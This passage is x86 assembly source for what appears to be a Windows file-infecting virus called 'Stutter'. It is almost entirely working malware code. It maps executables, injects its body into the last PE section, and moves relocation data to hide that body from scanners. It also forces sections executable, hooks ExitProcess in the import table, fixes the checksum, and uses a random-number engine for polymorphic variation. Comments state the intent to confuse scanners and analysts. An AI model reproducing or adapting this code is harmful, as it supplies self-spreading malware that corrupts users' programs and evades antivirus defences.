        call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        _int3z
        push    eax
        _int3z
        xchg    edi, eax
        _int3z
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        _int3z
        pop     ecx
        _int3z
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        _int3z
        pushad
        _int3z
        cdq
        _int3z
        mov     eax, dword ptr fs:[edx]
        _int3z
        push    dword ptr [eax + 4]
        _int3z
        push    dword ptr fs:[edx]
        _int3z
        mov     dword ptr fs:[edx], esp
        _int3z
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
        _int3z
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

unmap_seh       proc    near
        pop     eax
        _int3z
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        _int3z
        pop     eax
        _int3z
        popad                                   ;SEH destroys all registers
        _int3z
        push    eax
        _int3z
        push    edi
        _int3z
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        _int3z
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        _int3z
        pop     eax
        _int3z
        test    eax, eax
        _int3   pehdr_ret
unmap_seh       endp

;-----------------------------------------------------------------------------
;infect file
;algorithm:     increase file size by large amount to confuse scanners that
;               look at end of file
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               ExitProcess address is altered in import table.  very simple
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        _call   open_append
        push    ecx
        _int3z
        push    edi
        _int3z
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        _int3z
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        _int3z
        xor     ecx, ecx
        _int3z
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        _int3z
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        _int3z
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        _int3z
        lods    dword ptr [esi]
        _int3z
        mov     cx, offset stutter_codeend - offset stutter_inf
        _int3z
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        _int3z
        push    eax
        _int3z
        add     eax, ecx
        _int3z
        dec     edx
        _int3z
        add     eax, edx
        _int3z
        not     edx
        _int3z
        and     eax, edx                        ;file align last section
        _int3z
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax
        _int3z

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        _int3z
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        _int3z
        _jnb    test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        _int3z
        add     eax, ebp
        _int3z
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        _int3z
        dec     edx
        _int3z
        add     eax, edx
        _int3z
        not     edx
        _int3z
        and     eax, edx
        _int3z
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax
        _int3z

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        _int3z
        _jne    copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        _int3z
        _jb     copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        _int3z
        add     eax, ebp
        _int3z
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        _int3z
        _jnb    copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        _int3z
        pop     eax
        _int3z
        push    esi
        _int3z
        add     edi, dword ptr [esi]
        _int3z
        lea     esi, dword ptr [edi + eax - 1]
        _int3z
        lea     edi, dword ptr [esi + ecx]
        _int3z
        xchg    ecx, eax
        _int3z
        std
        _int3z
        rep     movs byte ptr [edi], byte ptr [esi]
        _int3z
        cld
        _int3z
        pop     esi
        _int3z
        pop     edi
        _int3z
        push    edi
        _int3z
        push    ecx
        _int3z
        xchg    ecx, eax
        _int3z

copy_code       label   near
        pop     edx
        _int3z
        add     ebp, edx
        _int3z
        xchg    ebp, eax
        _int3z
        add     edx, dword ptr [esi]
        _int3z
        add     edi, edx
        _int3z
        add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        _int3z
        mov     edx, dword ptr [esp + infectstk.infseh.mapsehregs + 8]
                                                ;retrieve -> platform APIs
        _int3z
        push    esi
        _int3z
        mov     esi, dword ptr [edx + 0ch]
        _int3z
        rep     movs byte ptr [edi], byte ptr [esi]
        _int3z
        pop     esi
        _int3z

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because for Windows XP SP2
;-----------------------------------------------------------------------------

        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], IMAGE_SCN_MEM_EXECUTE shr 18h
        _int3z
        pop     edi
        _int3z
        push    edi
        _int3z
        push    eax
        _int3z
        lea     eax, dword ptr [ebx + pehdr.pestackmax - pehdr.pechksum]
        _int3z
        xchg    esi, eax
        _int3z
        _call   gather_info
        pop     dword ptr [edi - 4]
        _int3z

;-----------------------------------------------------------------------------
;optional: GetProcAddress for every import, and store all Bound TimeDateStamps
;otherwise, there is chance that we will never execute
;-----------------------------------------------------------------------------

        pop     edi
        _int3z

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xor     eax, eax
        _int3z
        xchg    dword ptr [ebx], eax
        _int3z
        test    eax, eax
        _int3z
        _je     inftest_ret
        pop     ecx
        _int3z
        push    ecx
        _int3z
        inc     ecx
        _int3z
        shr     ecx, 1
        _int3z
        clc
        _int3z

calc_checksum   label   near
        adc     ax, word ptr [edi]
        _int3z
        inc     edi
        _int3z
        inc     edi
        _int3z
        dec     ecx
        _int3z
        _jne    calc_checksum
        pop     dword ptr [ebx]
        _int3z
        adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD
        _int3   inftest_ret
;        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
        pushad
        _int3z
        push    edi
        _int3z
        or      eax, 1
        _int3z
        mov     ecx, statelen
        _int3z

init_loop       label   near
        stos    dword ptr [edi]
        _int3z
        mov     edx, 69069
        _int3z
        mul     edx                             ;Knuth: x_new = x_old * 69069
        _int3z
        dec     ecx
        _int3z
        _jne    init_loop
        inc     ecx                             ;force reload
        _int3z
        _call   randvars

initdelta       label   near
        pop     edi
        _int3z
        movsx   eax, word ptr [edi + (instsize * 2) + 2]
        _int3z
        lea     edi, dword ptr [edi + eax + (instsize * 2) + 5]
        _int3z
        xchg    ecx, eax
        _int3z
        stos    dword ptr [edi]
        _int3z
        inc     edi
        _int3z
        pop     eax
        _int3z
        stos    dword ptr [edi]
        _int3z
        inc     edi
        _int3z
        stos    dword ptr [edi]
        _int3z
        popad
        _int3   pehdr_ret
randinit        endp

random          proc    near
        pushad
        _int3z
        _call   randelta

randvars        label   near
        mov     eax, '!bgr'                     ;numbers left
        mov     eax, '!bgr'                     ;next pointer
        mov     eax, '!bgr'                     ;state pointer
        _int3   initdelta

randelta        label   near
        pop     esi
        _int3z
        movsx   eax, word ptr [esi + instsize]
        _int3z
        lea     esi, dword ptr [esi + eax + instsize + 3]
        _int3z
        push    esi
        _int3z
        lods    dword ptr [esi]
        _int3z
        inc     esi
        _int3z
        xchg    ecx, eax
        _int3z
        lods    dword ptr [esi]
        _int3z
        inc     esi
        _int3z
        xchg    esi, eax
        _int3z
        dec     ecx
        _int3z
        _jne    random_ret
        mov     cl, statelen - period
        _int3z
        mov     esi, dword ptr [eax]
        _int3z
        lea     ebx, dword ptr [esi + (period * 4)]
        _int3z
        mov     edi, esi
        _int3z
        push    esi
        _int3z
        lods    dword ptr [esi]
        _int3z
        xchg    edx, eax
        _int3z
        _call   twist
        pop     ebx
        _int3z
        mov     cx, period - 1
        _int3z
        push    ecx
        _int3z
        push    ebx
        _int3z
        _call   twist
        pop     esi
        _int3z
        push    esi
        _int3z
        inc     ecx
        _int3z
        _call   twist
        xchg    edx, eax
        _int3z
        pop     esi
        _int3z
        pop     ecx
        _int3z
        inc     ecx
        _int3z

random_ret      label   near
        lods    dword ptr [esi]
        _int3z
        mov     edx, eax
        _int3z
        shr     eax, tshiftU
        _int3z
        xor     eax, edx
        _int3z
        mov     edx, eax
        _int3z
        shl     eax, tshiftS
        _int3z
        and     eax, tmaskB
        _int3z
        xor     eax, edx
        _int3z
        mov     edx, eax
        _int3z
        shl     eax, tshiftT
        _int3z
        and     eax, tmaskC
        _int3z
        xor     eax, edx
        _int3z
        mov     edx, eax
        _int3z
        shr     eax, tshiftL
        _int3z
        xor     eax, edx
        _int3z
        pop     edi
        _int3z
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        _int3z
        xchg    ecx, eax
        _int3z
        stos    dword ptr [edi]
        _int3z
        inc     edi
        _int3z
        xchg    esi, eax
        _int3z
        stos    dword ptr [edi]
        _int3z
        popad
        _int3   pehdr_ret
random          endp

twist           proc    near
        lods    dword ptr [esi]
        _int3z
        push    eax
        _int3z
        add     eax, eax                        ;remove highest bit
        _int3z
        add     edx, edx                        ;test highest bit
        _int3z
        rcr     eax, 2                          ;merge bits and test lowest bit
        _int3z
        _jnb    twist_skip                      ;remove branch but larger using:
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx
        _int3z

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        _int3z
        add     ebx, 4
        _int3z
        stos    dword ptr [edi]
        _int3z
        pop     edx
        _int3z
        dec     ecx
        _int3z
        jne     $ + instsize + 4
        _int3   pehdr_ret
        _int3   twist
twist           endp

randreg         proc    near
        _call   random
if only_xp
        and     eax, 7
        _int3z
        cmp     al, 4                           ;avoid ESP
        _int3z
        jne     $ + instsize + 4
        _int3   randreg
        _int3z
        cmp     al, 5                           ;avoid EBP
else
        and     eax, 3
        _int3z
        cmp     al, 3                           ;avoid EBX
endif
        _int3z
        jne     $ + instsize + 4
        _int3   randreg
        _int3   pehdr_ret
randreg         endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rva2raw         proc    near                    ;ecx = RVA, esi -> last section header
        push    esi
        _int3   rvanext

rvaloop         label   near
        sub     esi, size pesect
        _int3z

rvanext         label   near
        cmp     dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
        _int3z
        _jnbe   rvaloop
        sub     ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        _int3z
        add     ecx, dword ptr [esi]
        _int3z
        pop     esi
        _int3   pehdr_ret
rva2raw         endp

include rgblde.asm
stutter_codeend label   near

create_crcs     proc    near
        mov     al, 0b8h
        stos    byte ptr [edi]
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        mov     eax, insti
        ife __int3-0cch
        push    dword ptr [edi + 3]
        endif
        stos    dword ptr [edi]
        ife __int3-0cch
        dec     edi
        pop     dword ptr [edi]
        endif
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"         , 0
                db      "CreateFileA"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileA"      , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileA"       , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameA"    , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GetVersion"          , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "MultiByteToWideChar" , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesA"  , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0
                db      "VirtualAlloc"        , 0
                db      "VirtualFree"         , 0

sfcnames        db      "SfcIsFileProtected", 0

txttitle        db      "Stutter", 0
txtbody         db      "running...", 0

.code
        nop
end             dropper
